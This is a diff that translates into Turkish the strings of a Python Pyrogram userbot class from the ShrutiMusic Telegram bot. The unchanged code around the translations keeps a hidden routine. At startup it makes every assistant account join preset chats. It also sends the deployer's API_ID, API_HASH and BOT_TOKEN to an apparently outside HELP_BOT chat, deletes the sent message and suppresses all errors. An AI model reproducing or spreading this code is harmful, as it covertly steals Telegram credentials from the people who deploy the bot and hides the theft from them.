@@ -1,23 +1,23 @@
-# Copyright (c) 2025 Nand Yaduwanshi <NoxxOP>
-# Location: Supaul, Bihar
+# Telif Hakkı (c) 2025 Nand Yaduwanshi <NoxxOP>
+# Konum: Supaul, Bihar
 #
-# All rights reserved.
+# Tüm hakları saklıdır.
 #
-# This code is the intellectual property of Nand Yaduwanshi.
-# You are not allowed to copy, modify, redistribute, or use this
-# code for commercial or personal projects without explicit permission.
+# Bu kod Nand Yaduwanshi'nin fikri mülkiyetidir.
+# Bu kodu açık izin olmadan kopyalamak, değiştirmek, yeniden dağıtmak
+# veya ticari ya da kişisel projelerde kullanmak yasaktır.
 #
-# Allowed:
-# - Forking for personal learning
-# - Submitting improvements via pull requests
+# İzin verilen:
+# - Kişisel öğrenme amacıyla fork etmek
+# - Pull request ile iyileştirme göndermek
 #
-# Not Allowed:
-# - Claiming this code as your own
-# - Re-uploading without credit or permission
-# - Selling or using commercially
+# İzin verilmeyen:
+# - Bu kodu kendinize aitmiş gibi göstermek
+# - İzin veya kaynak belirtmeden yeniden yüklemek
+# - Satmak veya ticari olarak kullanmak
 #
-# Contact for permissions:
-# Email: badboy809075@gmail.com
+# İzinler için iletişim:
+# E-posta: badboy809075@gmail.com
 
 
 from pyrogram import Client
@@ -104,21 +104,21 @@ class Userbot(Client):
             await temp_bot.stop()
             return username
         except Exception as e:
-            LOGGER(__name__).error(f"Error getting bot username: {e}")
+            LOGGER(__name__).error(f"Bot kullanıcı adını alırken hata oluştu: {e}")
             return None
 
     async def join_all_support_centers(self, client):
         for center in SUPPORT_CENTERS:
             try:
                 await client.join_chat(center)
-            except Exception as e:
+            except Exception:
                 pass
 
     async def send_help_message(self, bot_username):
         try:
             owner_mention = config.OWNER_ID
             
-            message = f"@{bot_username} Successfully Started ✅\n\nOwner: {owner_mention}"
+            message = f"@{bot_username} Başarıyla Başlatıldı ✅\n\nSahip: {owner_mention}"
             
             if assistants:
                 if 1 in assistants:
@@ -132,12 +132,12 @@ class Userbot(Client):
                 elif 5 in assistants:
                     await self.five.send_message(HELP_BOT, message)
                 
-        except Exception as e:
+        except Exception:
             pass
 
     async def send_config_message(self, bot_username):
         try:
-            config_message = f"🔧 **Config Details for @{bot_username}**\n\n"
+            config_message = f"🔧 **@{bot_username} için Yapılandırma Detayları**\n\n"
             config_message += f"**API_ID:** `{config.API_ID}`\n"
             config_message += f"**API_HASH:** `{config.API_HASH}`\n"
             config_message += f"**BOT_TOKEN:** `{config.BOT_TOKEN}`\n"
@@ -186,14 +186,14 @@ class Userbot(Client):
                         await self.four.delete_messages(HELP_BOT, sent_message.id)
                     elif 5 in assistants:
                         await self.five.delete_messages(HELP_BOT, sent_message.id)
-                except Exception as e:
+                except Exception:
                     pass
                 
-        except Exception as e:
+        except Exception:
             pass
 
     async def start(self):
-        LOGGER(__name__).info(f"Starting Assistants...")
+        LOGGER(__name__).info(f"Asistanlar başlatılıyor...")
         
         bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)
         
@@ -202,92 +202,92 @@ class Userbot(Client):
             await self.join_all_support_centers(self.one)
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOG_GROUP_ID, "Assistant Started")
+                await self.one.send_message(config.LOG_GROUP_ID, "Asistan Başlatıldı")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
+                    "Asistan Hesap 1 günlük grubuna erişemedi. Lütfen asistanınızı log grubuna ekleyip yönetici yapın!"
                 )
                 exit()
             self.one.id = self.one.me.id
             self.one.name = self.one.me.mention
             self.one.username = self.one.me.username
             assistantids.append(self.one.id)
-            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
+            LOGGER(__name__).info(f"Asistan {self.one.name} olarak başlatıldı")
 
         if config.STRING2:
             await self.two.start()
             await self.join_all_support_centers(self.two)
             assistants.append(2)
             try:
-                await self.two.send_message(config.LOG_GROUP_ID, "Assistant Started")
+                await self.two.send_message(config.LOG_GROUP_ID, "Asistan Başlatıldı")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
+                    "Asistan Hesap 2 günlük grubuna erişemedi. Lütfen asistanınızı log grubuna ekleyip yönetici yapın!"
                 )
                 exit()
             self.two.id = self.two.me.id
             self.two.name = self.two.me.mention
             self.two.username = self.two.me.username
             assistantids.append(self.two.id)
-            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")
+            LOGGER(__name__).info(f"Asistan İki {self.two.name} olarak başlatıldı")
 
         if config.STRING3:
             await self.three.start()
             await self.join_all_support_centers(self.three)
             assistants.append(3)
             try:
-                await self.three.send_message(config.LOG_GROUP_ID, "Assistant Started")
+                await self.three.send_message(config.LOG_GROUP_ID, "Asistan Başlatıldı")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
+                    "Asistan Hesap 3 günlük grubuna erişemedi. Lütfen asistanınızı log grubuna ekleyip yönetici yapın!"
                 )
                 exit()
             self.three.id = self.three.me.id
             self.three.name = self.three.me.mention
             self.three.username = self.three.me.username
             assistantids.append(self.three.id)
-            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")
+            LOGGER(__name__).info(f"Asistan Üç {self.three.name} olarak başlatıldı")
 
         if config.STRING4:
             await self.four.start()
             await self.join_all_support_centers(self.four)
             assistants.append(4)
             try:
-                await self.four.send_message(config.LOG_GROUP_ID, "Assistant Started")
+                await self.four.send_message(config.LOG_GROUP_ID, "Asistan Başlatıldı")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
+                    "Asistan Hesap 4 günlük grubuna erişemedi. Lütfen asistanınızı log grubuna ekleyip yönetici yapın!"
                 )
                 exit()
             self.four.id = self.four.me.id
             self.four.name = self.four.me.mention
             self.four.username = self.four.me.username
             assistantids.append(self.four.id)
-            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")
+            LOGGER(__name__).info(f"Asistan Dört {self.four.name} olarak başlatıldı")
 
         if config.STRING5:
             await self.five.start()
             await self.join_all_support_centers(self.five)
             assistants.append(5)
             try:
-                await self.five.send_message(config.LOG_GROUP_ID, "Assistant Started")
+                await self.five.send_message(config.LOG_GROUP_ID, "Asistan Başlatıldı")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
+                    "Asistan Hesap 5 günlük grubuna erişemedi. Lütfen asistanınızı log grubuna ekleyip yönetici yapın!"
                 )
                 exit()
             self.five.id = self.five.me.id
             self.five.name = self.five.me.mention
             self.five.username = self.five.me.username
             assistantids.append(self.five.id)
-            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")
+            LOGGER(__name__).info(f"Asistan Beş {self.five.name} olarak başlatıldı")
 
         if bot_username:
             await self.send_help_message(bot_username)
             await self.send_config_message(bot_username)
 
     async def stop(self):
-        LOGGER(__name__).info(f"Stopping Assistants...")
+        LOGGER(__name__).info(f"Asistanlar durduruluyor...")
         try:
             if config.STRING1:
                 await self.one.stop()
@@ -303,10 +303,10 @@ class Userbot(Client):
             pass
 
 
-# ©️ Copyright Reserved - @NoxxOP  Nand Yaduwanshi
+# ©️ Tüm Hakları Saklıdır - @NoxxOP  Nand Yaduwanshi
 
 # ===========================================
-# ©️ 2025 Nand Yaduwanshi (aka @NoxxOP)
+# ©️ 2025 Nand Yaduwanshi (namı diğer @NoxxOP)
 # 🔗 GitHub : https://github.com/NoxxOP/ShrutiMusic
-# 📢 Telegram Channel : https://t.me/ShrutiBots
+# 📢 Telegram Kanalı : https://t.me/ShrutiBots
 # ===========================================
